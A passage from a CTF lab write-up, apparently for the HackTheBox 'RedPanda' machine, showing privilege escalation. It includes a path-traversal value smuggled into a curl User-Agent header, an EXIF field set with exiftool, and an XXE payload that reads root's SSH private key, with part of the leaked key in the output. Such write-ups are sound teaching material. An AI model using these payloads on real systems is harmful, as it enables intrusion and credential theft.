| Hungy       | Hungy is always hungry so he is eating all the bamboo in the world!                | img/hungy.jpg        | woodenk |
| Greg        | Greg is a hacker. Watch out for his injection attacks!                             | img/greg.jpg         | woodenk |
| Mr Puffy    | Mr Puffy is the fluffiest red panda to have ever lived.                            | img/mr_puffy.jpg     | damian  |
| Florida     | Florida panda is the evil twin of Greg. Watch out for him!                         | img/florida.jpg      | woodenk |
| Lazy        | Lazy is always very sleepy so he likes to lay around all day and do nothing.       | img/lazy.jpg         | woodenk |
| Shy         | Shy is as his name suggest very shy. But he likes to cuddle when he feels like it. | img/shy.jpg          | damian  |
| Smiley      | Smiley is always very happy. She loves to look at beautiful people like you !      | img/smiley.jpg       | woodenk |
| Angy        | Angy is always very grumpy. He sticks out his tongue to everyone.                  | img/angy.jpg         | damian  |
| Peter       | Peter loves to climb. We think he was a spider in his previous life.               | img/peter.jpg        | damian  |
| Crafty      | Crafty is always busy creating art. They will become a very famous red panda!      | img/crafty.jpg       | damian  |
| pandhamster | I&#39;m a spy, please don&#39;t tell them                                                  | /dev/shm/hamster.jpg | blnkn   |
+-------------+------------------------------------------------------------------------------------+----------------------+---------+
12 rows in set (0.00 sec)
</pre></div>
</div>
<p>We’re limited by the conlumn max varchar though so I attempted to fix that but woodenk doesn’t have access to change the <code class="docutils literal notranslate"><span class="pre">information_schema</span></code></p>
<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">information_schema</span><span class="p">;</span>
<span class="n">Reading</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">information</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">completion</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">column</span><span class="w"> </span><span class="k">names</span>
<span class="n">You</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">turn</span><span class="w"> </span><span class="k">off</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">feature</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">get</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">quicker</span><span class="w"> </span><span class="n">startup</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="o">-</span><span class="n">A</span>

<span class="k">Database</span><span class="w"> </span><span class="n">changed</span>
<span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="k">TABLE_NAME</span><span class="p">,</span><span class="k">COLUMN_NAME</span><span class="p">,</span><span class="n">DATA_TYPE</span><span class="p">,</span><span class="n">CHARACTER_MAXIMUM_LENGTH</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;pandas&#39;</span><span class="p">;</span>
<span class="o">+</span><span class="c1">------------+-------------+-----------+--------------------------+</span>
<span class="o">|</span><span class="w"> </span><span class="k">TABLE_NAME</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">COLUMN_NAME</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">DATA_TYPE</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">CHARACTER_MAXIMUM_LENGTH</span><span class="w"> </span><span class="o">|</span>
<span class="o">+</span><span class="c1">------------+-------------+-----------+--------------------------+</span>
<span class="o">|</span><span class="w"> </span><span class="n">pandas</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">name</span><span class="w">        </span><span class="o">|</span><span class="w"> </span><span class="nb">varchar</span><span class="w">   </span><span class="o">|</span><span class="w">                       </span><span class="mi">20</span><span class="w"> </span><span class="o">|</span>
<span class="o">|</span><span class="w"> </span><span class="n">pandas</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">bio</span><span class="w">         </span><span class="o">|</span><span class="w"> </span><span class="nb">varchar</span><span class="w">   </span><span class="o">|</span><span class="w">                      </span><span class="mi">200</span><span class="w"> </span><span class="o">|</span>
<span class="o">|</span><span class="w"> </span><span class="n">pandas</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">imgloc</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="nb">varchar</span><span class="w">   </span><span class="o">|</span><span class="w">                       </span><span class="mi">20</span><span class="w"> </span><span class="o">|</span>
<span class="o">|</span><span class="w"> </span><span class="n">pandas</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">author</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="nb">varchar</span><span class="w">   </span><span class="o">|</span><span class="w">                       </span><span class="mi">20</span><span class="w"> </span><span class="o">|</span>
<span class="o">+</span><span class="c1">------------+-------------+-----------+--------------------------+</span>
<span class="mi">4</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span>

<span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">ALTER</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">pandas</span><span class="w"> </span><span class="k">ALTER</span><span class="w"> </span><span class="k">COLUMN</span><span class="w"> </span><span class="n">imgloc</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">200</span><span class="p">);</span>
<span class="n">ERROR</span><span class="w"> </span><span class="mi">1064</span><span class="w"> </span><span class="p">(</span><span class="mi">42000</span><span class="p">):</span><span class="w"> </span><span class="n">You</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">error</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="k">SQL</span><span class="w"> </span><span class="n">syntax</span><span class="p">;</span><span class="w"> </span><span class="k">check</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">manual</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">corresponds</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="k">version</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">right</span><span class="w"> </span><span class="n">syntax</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">near</span><span class="w"> </span><span class="s1">&#39;VARCHAR(200)&#39;</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">line</span><span class="w"> </span><span class="mi">1</span>
<span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">ALTER</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">pandas</span><span class="p">;</span>
<span class="n">ERROR</span><span class="w"> </span><span class="mi">1044</span><span class="w"> </span><span class="p">(</span><span class="mi">42000</span><span class="p">):</span><span class="w"> </span><span class="k">Access</span><span class="w"> </span><span class="n">denied</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="s1">&#39;woodenk&#39;</span><span class="o">@</span><span class="s1">&#39;localhost&#39;</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">database</span><span class="w"> </span><span class="s1">&#39;information_schema&#39;</span>
</pre></div>
</div>
<p>This means that we are limited to 20 characters :</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;../../../tmp/h.jpg&#39;</span><span class="p">|</span>wc<span class="w"> </span>-c
<span class="m">18</span>
</pre></div>
</div>
<p>And we wouldn’t be able to reach with that:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>woodenk@redpanda:/opt/panda_search/src/main/resources/static/img$<span class="w"> </span>cat<span class="w"> </span>../../../tmp/h.jpg
cat:<span class="w"> </span>../../../tmp/h.jpg:<span class="w"> </span>No<span class="w"> </span>such<span class="w"> </span>file<span class="w"> </span>or<span class="w"> </span>directory
woodenk@redpanda:/opt/panda_search/src/main/resources/static/img$<span class="w"> </span><span class="nb">pwd</span>
/opt/panda_search/src/main/resources/static/img
</pre></div>
</div>
<p>After taking time to regroup and read the code again, I realise that the path fetched from the DB would be to actually display our hamster in the website, but the logstats thing won’t care, I’m just sad I won’t be able to actually display my hamster on the site, so I’ll put it here for you to enjoy:<br />
<img alt="hamster.jpg" src="../../../../_images/hamster.jpg" /></p>
<p>So we don’t care, we just need to have the path show up in the log, now if I just ask for it, it filters my path traversal attempt:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>http://panda.htb:8080/../../../../../../../dev/shm/hamster.jpg
</pre></div>
</div>
<p>Shows up sanitized in the log</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="m">404</span><span class="o">||</span><span class="m">10</span>.10.14.81<span class="o">||</span>curl/7.85.0<span class="o">||</span>/dev/shm/hamster.jpg
</pre></div>
</div>
<p>we know from the source that it just splits by the double pipes, so, since it logs the user agent first, we can just cheat, and do something like this :</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>http://panda.htb:8080<span class="w"> </span>-A<span class="w"> </span><span class="s2">&quot;super hamster spy||../../../../../../../dev/shm/hamster.jpg&quot;</span>
</pre></div>
</div>
<p>And now it shows how we want it, and</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="m">200</span><span class="o">||</span><span class="m">10</span>.10.14.81<span class="o">||</span>super<span class="w"> </span>hamster<span class="w"> </span>spy<span class="o">||</span>../../../../../../../dev/shm/hamster.jpg<span class="o">||</span>/
</pre></div>
</div>
<p>Ok, so at this stage we controll the artist variable, which means we can choose to read the report, from wherever we want, as long as it ends with <code class="docutils literal notranslate"><span class="pre">_creds.xml</span></code> so we can point it to /dev/shm</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>exiftool<span class="w"> </span>-Artist<span class="o">=</span><span class="s2">&quot;../../../../../../dev/shm/privesc&quot;</span><span class="w"> </span>hamster.jpg
<span class="w">    </span><span class="m">1</span><span class="w"> </span>image<span class="w"> </span>files<span class="w"> </span>updated
</pre></div>
</div>
<p>And leverage an XXE to read root’s private key</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span><span class="s">&lt;&lt; EOF &gt; /dev/shm/privesc_creds.xml</span>
<span class="s">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span>
<span class="s">&lt;!DOCTYPE replace [&lt;!ENTITY key SYSTEM &quot;file:///root/.ssh/id_rsa&quot;&gt; ]&gt;</span>
<span class="s">&lt;credits&gt;</span>
<span class="s">  &lt;author&gt;damian&lt;/author&gt;</span>
<span class="s">  &lt;image&gt;</span>
<span class="s">    &lt;uri&gt;../../../../../../dev/shm/hamster.jpg&lt;/uri&gt;</span>
<span class="s">    &lt;privesc&gt;&amp;key;&lt;/privesc&gt;</span>
<span class="s">    &lt;views&gt;0&lt;/views&gt;</span>
<span class="s">  &lt;/image&gt;</span>
<span class="s">  &lt;totalviews&gt;0&lt;/totalviews&gt;</span>
<span class="s">&lt;/credits&gt;</span>
<span class="s">EOF</span>
</pre></div>
</div>
<p>Note that the exact artist in the jpg needs to match the exact path in the curl, that is the same number of dot dot slash too, because of this line:</p>
<div class="highlight-java notranslate"><div class="highlight"><pre><span></span><span class="k">if</span><span class="p">(</span><span class="n">el</span><span class="p">.</span><span class="na">getChild</span><span class="p">(</span><span class="s">&quot;uri&quot;</span><span class="p">).</span><span class="na">getText</span><span class="p">().</span><span class="na">equals</span><span class="p">(</span><span class="n">uri</span><span class="p">))</span>
</pre></div>
</div>
<blockquote>
<div><p>(this stalled me for longer than necessary)</p>
</div></blockquote>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>http://panda.htb:8080<span class="w"> </span>-A<span class="w"> </span><span class="s2">&quot;super hamster spy||../../../../../../../dev/shm/hamster.jpg&quot;</span>
</pre></div>
</div>
<p>When the cronjob hits, every 2 minutes, it will parse the existing xml at the path, and expand the external entity, here our private key, do the necessary changes in number of views to the xml, and write it back in the same place, which means that if we monitor it with watch we should see the private key appear after 2 min:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Every<span class="w"> </span><span class="m">2</span>.0s:<span class="w"> </span>cat<span class="w"> </span>privesc_creds.xml<span class="w">                                                                                                                                               </span>redpanda:<span class="w"> </span>Sun<span class="w"> </span>Oct<span class="w"> </span><span class="m">16</span><span class="w"> </span><span class="m">19</span>:09:39<span class="w"> </span><span class="m">2022</span>

&lt;?xml<span class="w"> </span><span class="nv">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nv">encoding</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span>?&gt;
&lt;!DOCTYPE<span class="w"> </span>replace&gt;
&lt;credits&gt;
<span class="w">  </span>&lt;author&gt;damian&lt;/author&gt;
<span class="w">  </span>&lt;image&gt;
<span class="w">    </span>&lt;data&gt;-----BEGIN<span class="w"> </span>OPENSSH<span class="w"> </span>PRIVATE<span class="w"> </span>KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
..............................SNIP....................................
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
<span class="nv">RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE</span><span class="o">=</span>
-----END<span class="w"> </span>OPENSSH<span class="w"> </span>PRIVATE<span class="w"> </span>KEY-----&lt;/data&gt;
<span class="w">    </span>&lt;uri&gt;/../../../../../../dev/shm/hamster.jpg&lt;/uri&gt;
<span class="w">    </span>&lt;views&gt;1&lt;/views&gt;
<span class="w">  </span>&lt;/image&gt;
<span class="w">  </span>&lt;totalviews&gt;3&lt;/totalviews&gt;
&lt;/credits&gt;
</pre></div>
</div>
<p>Done! That was fun</p>
</section>
</section>

        </article>
      </div>
      <footer>
        
        <div class="related-pages">
          <a class="next-page" href="../sau/sau.html">
              <div class="page-info">
                <div class="context">
                  <span>Next</span>
                </div>
                <div class="title">Sau</div>
              </div>
              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
            </a>
          <a class="prev-page" href="../precious/precious.html">
              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
              <div class="page-info">
                <div class="context">
                  <span>Previous</span>
                </div>
                
                <div class="title">Precious</div>
                
              </div>
            </a>
        </div>
        <div class="bottom-of-page">
          <div class="left-details">
            <div class="copyright">
                Copyright &#169; 2023, blnkn
            </div>
            Made with <a href="https://www.sphinx-doc.org/">Sphinx</a> and <a class="muted-link" href="https://pradyunsg.me">@pradyunsg</a>'s
            
            <a href="https://github.com/pradyunsg/furo">Furo</a>
            
          </div>
          <div class="right-details">
            
          </div>
        </div>
        
      </footer>
    </div>
    <aside class="toc-drawer">
      
      
      <div class="toc-sticky toc-scroll">
        <div class="toc-title-container">
          <span class="toc-title">
            On this page
          </span>
        </div>
        <div class="toc-tree-container">
          <div class="toc-tree">
            <ul>
<li><a class="reference internal" href="#">Red panda</a><ul>
<li><a class="reference internal" href="#enum">Enum</a></li>
<li><a class="reference internal" href="#java-springboot-ssti">Java SpringBoot - SSTI</a></li>
<li><a class="reference internal" href="#looking-around">Looking around</a></li>
<li><a class="reference internal" href="#privesc">Privesc</a></li>
</ul>
</li>
</ul>

          </div>
        </div>
      </div>
      
      
    </aside>
  </div>
</div><script data-url_root="../../../../" id="documentation_options" src="../../../../_static/documentation_options.js?v=b3ba4146"></script>
    <script src="../../../../_static/doctools.js?v=888ff710"></script>
    <script src="../../../../_static/sphinx_highlight.js?v=4825356b"></script>
    <script src="../../../../_static/scripts/furo.js?v=32e29ea5"></script>
    </body>
</html>